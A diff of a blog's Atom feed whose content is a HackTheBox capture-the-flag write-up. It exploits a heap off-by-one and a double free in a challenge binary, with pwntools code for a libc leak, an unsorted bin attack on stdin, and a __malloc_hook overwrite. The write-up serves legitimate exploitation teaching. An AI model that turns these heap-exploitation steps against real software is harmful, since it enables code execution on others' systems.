@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?> 
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
-    <generator uri="https://gohugo.io/" version="0.80.0">Hugo</generator><title type="html"><![CDATA[HackTheBox on repr]]></title>
+    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[HackTheBox on repr]]></title>
     
         <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
     
@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/HackTheBox/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/HackTheBox/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-08-02T13:40:56+02:00</updated>
+    <updated>2022-08-09T21:05:06+02:00</updated>
     
         <author>
             <name>nasm</name>
@@ -56,7 +56,7 @@ Find the tasks and the final exploit <a
   
   >IDA freeware</a
 >:</p>
-<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h] BYREF
 </span><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]
@@ -91,7 +91,7 @@ Find the tasks and the final exploit <a
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div><p>The binary allows you to allocate a small chunk beetween <code>0x1f</code> and <code>0x38</code> bytes:</p>
-<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">small_alloc</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">small_alloc</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx
 </span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">nmemb</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF
@@ -123,7 +123,7 @@ Find the tasks and the final exploit <a
 <span class="p">}</span>
 </code></pre></div><p>As you can see right above this function contains an off-by-one vulnerability, which means we can write only one byte right after the allocated chunk, overlapping the size field of the next chunk / top chunk.</p>
 <p>The fix function frees a chunk and asks for another size, then it allocates another chunk with <code>calloc</code>.</p>
-<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">fix</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">fix</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
 </span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx
@@ -171,7 +171,7 @@ Find the tasks and the final exploit <a
 <span class="p">}</span>
 </code></pre></div><p>If we reach <code>[1]</code>, <code>alloc_array[2 * idx]</code> is freed leading to a double free.</p>
 <p>We can print a chunk only one time:</p>
-<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">examine</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">examine</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h] BYREF
 </span><span class="c1"></span>
@@ -186,7 +186,7 @@ Find the tasks and the final exploit <a
     <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-] Invalid!&#34;</span><span class="p">);</span>
 <span class="p">}</span>
 </code></pre></div><p>Finally we can malloc a huge chunk, but we cannot wriet anything within:</p>
-<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">savebig</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">savebig</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">void</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rax
 </span><span class="c1"></span>  <span class="n">size_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h] BYREF
@@ -268,16 +268,16 @@ Find the tasks and the final exploit <a
     </h2>
 </div>
 <p>Partial overwrites are as far as I know very hard to get because of <code>calloc</code>. The first thing to do is to leak libc addresses to then target libc global variables / structures. The classic way to get a libc leak is to free a chunk that belongs to the unsorted bin and then print it. But as seen previously, we cannot allocate a large chunks that would end up in the unsorted bin. To do so we have to use the off-by-one bug to overwrite the next chunk&rsquo;s size field with a bigger one that would correspond to the unsorted bin (<code>&gt;= 0x90</code>). We can edit the size of the second chunk from <code>0x30</code> to <code>0xb0</code> by doing:</p>
-<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">hang</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">hang</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choose an index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;How much space do you need for it: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
-    <span class="k">if</span> <span class="n">hang</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">hang</span> <span class="o">==</span> <span class="kc">True</span><span class="p">:</span>
         <span class="k">return</span>
 
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input your weapon&#39;s details: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">freexalloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">freexalloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Choose an index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
     <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;How much space do you need for this repair: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
@@ -308,11 +308,11 @@ Find the tasks and the final exploit <a
 
 <span class="c1"># freexalloc(5, 560, b&#34;&#34;, doubleFree=True)</span>
 
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 <span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">56</span>  <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xb1</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># fake unsorted chunk</span>
 
 <span class="s2">&#34;&#34;&#34;
@@ -352,15 +352,15 @@ Find the tasks and the final exploit <a
   >this resource</a
 >.</p>
 <p>Now that <code>chunk_2</code> has been tampered with a fake <code>0xb0</code> size, we just have to free it 8 times (to fill the tcache) to put it in the unsorted bin:</p>
-<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 <span class="c1"># falls into the unsortedbin</span>
 
 <span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
@@ -368,7 +368,7 @@ Find the tasks and the final exploit <a
 <span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3ebca0</span> <span class="c1"># offset of the unsorted bin</span>
 
 <span class="n">stdin</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3eba00</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;libc: {hex(libc)}&#34;</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
 
 <span class="s2">&#34;&#34;&#34;
 </span><span class="s2">0x555555608560:	0x0000000000000000	0x0000000000000041
@@ -400,7 +400,7 @@ Find the tasks and the final exploit <a
 </span><span class="s2">0xb0 [  7]: 0x5555556085f0 —▸ 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556086b0 ◂— 0x0
 </span><span class="s2">&#34;&#34;&#34;</span>
 </code></pre></div><p>Which gives:</p>
-<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">nasm@off:~/Documents/pwn/HTB/apocalypse/onceAndmore$ python3 exploit.py LOCAL GDB NOASLR
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">nasm@off:~/Documents/pwn/HTB/apocalypse/onceAndmore$ python3 exploit.py LOCAL GDB NOASLR
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/HTB/apocalypse/onceAndmore/once_and_for_all&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -427,7 +427,7 @@ Find the tasks and the final exploit <a
   
   >glibc source code</a
 >:</p>
-<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
 <span class="nf">_IO_new_file_underflow</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="n">_IO_ssize_t</span> <span class="n">count</span><span class="p">;</span>
@@ -513,7 +513,7 @@ Find the tasks and the final exploit <a
   <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div><p>The interesting part is the <code>count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</code> which reads <code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code> bytes in <code>fp-&gt;_IO_buf_base</code>. Which means if <code>fp-&gt;_IO_buf_end</code> is replaced with the help of an unsorted bin attack by the address of the unsorted bin and that <code>&amp;unsorted bin &gt; fp-&gt;_IO_buf_base</code>, we can trigger an out of bound write from a certain address up to the address of the unsorted bin. We can inspect the layout in gdb to see what&rsquo;s actually going on:</p>
-<pre><code>pwndbg&gt; x/100gx stdin
+<pre tabindex="0"><code>pwndbg&gt; x/100gx stdin
 0x7ffff7dcfa00 &lt;_IO_2_1_stdin_&gt;:	0x00000000fbad208b	0x00007ffff7dcfa83
 0x7ffff7dcfa10 &lt;_IO_2_1_stdin_+16&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
 0x7ffff7dcfa20 &lt;_IO_2_1_stdin_+32&gt;:	0x00007ffff7dcfa83	0x00007ffff7dcfa83
@@ -622,7 +622,7 @@ $1 = {
   
   >code</a
 >:</p>
-<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span>
 <span class="nf">_int_malloc</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">bytes</span><span class="p">)</span>
 <span class="p">{</span>
 
@@ -712,7 +712,7 @@ $1 = {
 	<span class="p">[...]</span>
 <span class="p">}</span>
 </code></pre></div><p>According to what I said earlier, the goal is to replace <code>stdin-&gt;_IO_buf_end</code> with <code>&amp;unsortedbin</code> which means we have to write to the backward pointer of the last chunk in the unsorted bin (chunk_2) <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To do so we can trigger a write after free primitive by taking back <code>chunk_2</code> from the unsorted bin to the fastbin:</p>
-<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="s2">&#34;&#34;&#34;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="s2">&#34;&#34;&#34;
 </span><span class="s2">Before:
 </span><span class="s2">0x30: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
 </span><span class="s2">0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
@@ -737,21 +737,21 @@ $1 = {
 </span><span class="s2">BK: 0x5555556085e0 —▸ 0x7ffff7dcfa30 (_IO_2_1_stdin_+48) ◂— 0x0
 </span><span class="s2">&#34;&#34;&#34;</span>
 </code></pre></div><p>As you can read right above, the <code>chunk_2</code> has its backward pointer set to <code>&amp;stdin-&gt;_IO_buf_end - 0x10</code>. To achieve the partial unlink we just have to request a <code>0x30</code> sized chunk with nothing in the fastbin freelists. That&rsquo;s the last step of the unsortedbin attack, clean out the fastbin:</p>
-<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="s2">&#34;&#34;&#34;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="s2">&#34;&#34;&#34;
 </span><span class="s2">Before: same as above
 </span><span class="s2">&#34;&#34;&#34;</span>
 
 <span class="c1"># == clean fastbin</span>
 
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 <span class="n">add</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x40</span><span class="s2">&#34;</span><span class="p">)</span>
 
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 <span class="n">add</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
 
-<span class="n">freexalloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">freexalloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">560</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">doubleFree</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 <span class="n">add</span><span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x30</span><span class="s2">&#34;</span><span class="p">)</span>
 
 <span class="n">add</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span>
@@ -764,9 +764,9 @@ $1 = {
 </span><span class="s2">0x40: 0x0
 </span><span class="s2">&#34;&#34;&#34;</span>
 </code></pre></div><p>Now we just have to ask for a <code>0x30</code> sized chunk:</p>
-<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1337&#34;</span><span class="p">,</span> <span class="n">hang</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;unsortedbin attack done on: {hex(stdin + 0x40 - 0x10)}&#34;</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;Enjoy your shell!&#34;</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1337&#34;</span><span class="p">,</span> <span class="n">hang</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;unsortedbin attack done on: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stdin</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Enjoy your shell!&#34;</span><span class="p">)</span>
 
 <span class="s2">&#34;&#34;&#34;
 </span><span class="s2">After:
@@ -782,7 +782,7 @@ $1 = {
     </h2>
 </div>
 <p>The last part is very easy, we just have to overflow up to <code>&amp;__malloc_hook</code> to write the one-gadget:</p>
